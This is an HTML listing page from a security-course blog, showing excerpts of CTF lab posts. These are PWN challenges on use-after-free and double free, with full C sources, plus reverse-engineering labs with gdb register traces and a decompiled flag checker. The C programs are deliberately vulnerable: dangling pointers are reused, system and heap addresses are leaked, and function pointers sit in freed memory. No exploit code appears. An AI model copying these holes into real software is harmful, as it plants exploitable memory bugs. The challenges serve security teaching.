</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (entities[idx])
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		printf(<span style=color:#e6db74>&#34;Name: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, entities[idx]<span style=color:#f92672>-&gt;</span>name);
</span></span><span style=display:flex><span>		entities[idx]<span style=color:#f92672>-&gt;</span>event_handle(entities[idx]<span style=color:#f92672>-&gt;</span>event);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	setvbuf(stdin, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	setvbuf(stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;gift1: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#f92672>&amp;</span>system);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>ptr <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x10</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;gift2: %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, ptr);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (;;)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		memu();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>int</span> choice <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>switch</span> (choice)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			register_entity();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			delete_entity();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			set_name();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			trigger_event();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			puts(<span style=color:#e6db74>&#34;Invalid command&#34;</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn-0x38lab---uaf/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/>Simple PWN 0x39(Lab - Double Free)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=simple-pwn-0x39lab---double-free>Simple PWN 0x39(Lab - Double Free)
<a class=anchor href=#simple-pwn-0x39lab---double-free>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://hackmd.io/@SBK6401/rkD83kaji>0x18(Lab - <code>babynote</code>)</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;sys/types.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;fcntl.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>note</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>content;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> len;
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>note</span> notes[<span style=color:#ae81ff>0x10</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>read_int</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x1f</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> atoi(buf);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>long</span> <span style=color:#a6e22e>read_ul</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x1f</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> strtoul(buf, NULL, <span style=color:#ae81ff>10</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>get_idx</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (idx <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0x10</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> idx;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>add_note</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Length: &#34;</span>);
</span></span><span style=display:flex><span>	notes[idx].len <span style=color:#f92672>=</span> read_ul();
</span></span><span style=display:flex><span>	notes[idx].content <span style=color:#f92672>=</span> malloc(notes[idx].len);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Add done&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>read_note</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Note[%d]:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, idx);
</span></span><span style=display:flex><span>	write(<span style=color:#ae81ff>1</span>, notes[idx].content, notes[idx].len);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>write_note</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Content: &#34;</span>);
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, notes[idx].content, notes[idx].len);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>delete_note</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	free(notes[idx].content);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;Delete done&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>memu</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;1. add note&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;2. read note&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;3. write note&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;4. delete note&#34;</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;choice: &#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	setvbuf(stdin, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	setvbuf(stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> fd <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;./flag.txt&#34;</span>, O_RDONLY);
</span></span><span style=display:flex><span>	notes[<span style=color:#ae81ff>0</span>].len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x30</span>;
</span></span><span style=display:flex><span>	notes[<span style=color:#ae81ff>0</span>].content <span style=color:#f92672>=</span> malloc(<span style=color:#ae81ff>0x30</span>);
</span></span><span style=display:flex><span>	read(fd, notes[<span style=color:#ae81ff>0</span>].content, <span style=color:#ae81ff>0x30</span>);
</span></span><span style=display:flex><span>	close(fd);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (;;)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		memu();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>int</span> choice <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>switch</span> (choice)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			add_note();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			read_note();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			write_note();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>4</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			delete_note();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			puts(<span style=color:#e6db74>&#34;Invalid command&#34;</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn-0x39lab---double-free/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/>Simple PWN 0x40(2023 HW - UAF++)</a></h2><div class=text-small><a href=/tags/eductf/>Eductf</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/pwn/>PWN</a></div><p><h1 id=simple-pwn-0x402023-hw---uaf>Simple PWN 0x40(2023 HW - UAF++)
<a class=anchor href=#simple-pwn-0x402023-hw---uaf>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://hackmd.io/@SBK6401/SJWc9v4Bp>0x34(2023 Lab - UAF):three:</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler Source Code</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;string.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>default_handle</span>(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>event)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;EVENT: get event named </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>%s</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, event);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>entity</span>
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>name;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>event;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>void</span> (<span style=color:#f92672>*</span>event_handle)(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>);
</span></span><span style=display:flex><span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>entity</span> <span style=color:#f92672>*</span>entities[<span style=color:#ae81ff>0x2</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>read_int</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>0x20</span>];
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, buf, <span style=color:#ae81ff>0x1f</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> atoi(buf);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>get_idx</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (idx <span style=color:#f92672>&gt;=</span> <span style=color:#ae81ff>0x2</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> idx;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>memu</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;1. register entity&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;2. delete entity&#34;</span>);
</span></span><span style=display:flex><span>	puts(<span style=color:#e6db74>&#34;3. trigger event&#34;</span>);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;choice: &#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>register_entity</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> len;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	entities[idx] <span style=color:#f92672>=</span> malloc(<span style=color:#66d9ef>sizeof</span>(<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>entity</span>));
</span></span><span style=display:flex><span>	entities[idx]<span style=color:#f92672>-&gt;</span>event <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Default Event&#34;</span>;
</span></span><span style=display:flex><span>	entities[idx]<span style=color:#f92672>-&gt;</span>event_handle <span style=color:#f92672>=</span> default_handle;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Nmae Length: &#34;</span>);
</span></span><span style=display:flex><span>	len <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (len <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> len <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x430</span>)
</span></span><span style=display:flex><span>		exit(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	entities[idx]<span style=color:#f92672>-&gt;</span>name <span style=color:#f92672>=</span> malloc(len);
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Name: &#34;</span>);
</span></span><span style=display:flex><span>	read(<span style=color:#ae81ff>0</span>, entities[idx]<span style=color:#f92672>-&gt;</span>name, len <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>delete_entity</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (entities[idx])
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		free(entities[idx]<span style=color:#f92672>-&gt;</span>name);
</span></span><span style=display:flex><span>		free(entities[idx]);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>		puts(<span style=color:#e6db74>&#34;Invalid index&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>trigger_event</span>()
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>int</span> idx;
</span></span><span style=display:flex><span>	printf(<span style=color:#e6db74>&#34;Index: &#34;</span>);
</span></span><span style=display:flex><span>	idx <span style=color:#f92672>=</span> get_idx();
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> (entities[idx])
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		printf(<span style=color:#e6db74>&#34;Name: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, entities[idx]<span style=color:#f92672>-&gt;</span>name);
</span></span><span style=display:flex><span>		entities[idx]<span style=color:#f92672>-&gt;</span>event_handle(entities[idx]<span style=color:#f92672>-&gt;</span>event);
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>void</span>)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	setvbuf(stdin, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	setvbuf(stdout, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> (;;)
</span></span><span style=display:flex><span>	{
</span></span><span style=display:flex><span>		memu();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>int</span> choice <span style=color:#f92672>=</span> read_int();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>switch</span> (choice)
</span></span><span style=display:flex><span>		{
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			register_entity();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			delete_entity();
</span></span><span style=display:flex><span>			<span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>case</span> <span style=color:#ae81ff>3</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			trigger_event();
</span></span><span style=display:flex><span>		<span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>			puts(<span style=color:#e6db74>&#34;Invalid command&#34;</span>);
</span></span><span style=display:flex><span>		}
</span></span><span style=display:flex><span>	}
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p><a href=/security/course/ntu-cs/pwn/simple-pwn-0x402023-hw---uaf++/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/>Simple Reverse - 0x01(Lab - Sacred Arts)</a></h2><div class=text-small><a href=/tags/reverse/>Reverse</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/eductf/>Eductf</a></div><p><h1 id=simple-reverse---0x01lab---sacred-arts>Simple Reverse - 0x01(Lab - Sacred Arts)
<a class=anchor href=#simple-reverse---0x01lab---sacred-arts>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://zh.wikibooks.org/wiki/X86%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80/%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E9%9B%86>X86組合語言/基本指令集</a></li><li><a href="https://www.ibm.com/docs/en/aix/7.1?topic=set-neg-negate-instruction">neg (Negate) instruction</a>
實作：先在執行<code>neg rax</code>之前把<code>$rax</code>設定成2，執行指令之後剛好是2的補數<pre tabindex=0><code class=language-! data-lang=!>gef➤  set $rax=2
gef➤  info r $rax
rax            0x2                 0x2
gef➤  ni
0x00000000004010e0 in ?? ()
gef➤  info r $rax
rax            0xfffffffffffffffe  0xfffffffffffffffe
</code></pre></li><li><a href=https://zh.wikibooks.org/zh/X86%E7%B5%84%E5%90%88%E8%AA%9E%E8%A8%80/%E5%9F%BA%E6%9C%AC%E6%8C%87%E4%BB%A4%E9%9B%86/IA32%E6%8C%87%E4%BB%A4:xchg>X86組合語言/基本指令集/IA32指令:xchg</a>
實作：執行<code>xchg ah, al</code>之前先看一下<code>$rax</code>的狀態<pre tabindex=0><code class=language-! data-lang=!>gef➤  info r $rax
rax            0xfffffffffffffffe  0xfffffffffffffffe
gef➤  ni
0x00000000004010e2 in ?? ()
gef➤  info r $rax
rax            0xfffffffffffffeff  0xfffffffffffffeff
</code></pre></li></ul><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler IDA Pro Disassembler Code</p><a href=/security/course/ntu-cs/reverse/simple-reverse---0x01lab---sacred-arts/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/>Simple Reverse - 0x03(Lab - Why)</a></h2><div class=text-small><a href=/tags/ctf/>CTF</a>,
<a href=/tags/eductf/>Eductf</a>,
<a href=/tags/reverse/>Reverse</a></div><p><h1 id=simple-reverse---0x03lab---why>Simple Reverse - 0x03(Lab - Why)
<a class=anchor href=#simple-reverse---0x03lab---why>#</a></h1><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li><a href=https://chenhh.gitbooks.io/parallel_processing/content/cython/function_pointer.html>What is function pointer?</a></li><li><a href="https://www.youtube.com/live/IJlYPH1ljIY?feature=share&amp;t=9587">Lecture Vid.</a>
<img src=https://hackmd.io/_uploads/BJlVKMiO2.png alt></li></ul><h2 id=source-code>Source Code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler IDA main function</p><pre tabindex=0><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+Ch] [rbp-4h]

  printf(&#34;Give me flag: &#34;);
  __isoc99_scanf(&#34;%25s&#34;, buf);
  for ( i = 0; i &lt;= 24; ++i )
  {
    if ( buf[i] - 10 != enc_flag[i] )
      return 0;
  }
  pass = 1;
  return 0;
}
</code></pre><p>:::</p><a href=/security/course/ntu-cs/reverse/simple-reverse---0x03lab---why/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/eductf/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/eductf/page/4/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/eductf/page/3/ aria-label="Page 3" class=page-link role=button>3</a></li><li class=page-item><a href=/tags/eductf/page/4/ aria-label="Page 4" class=page-link role=button>4</a></li><li class="page-item active"><a aria-current=page aria-label="Page 5" class=page-link role=button>5</a></li><li class=page-item><a href=/tags/eductf/page/6/ aria-label="Page 6" class=page-link role=button>6</a></li><li class=page-item><a href=/tags/eductf/page/7/ aria-label="Page 7" class=page-link role=button>7</a></li><li class=page-item><a href=/tags/eductf/page/6/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/eductf/page/9/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li 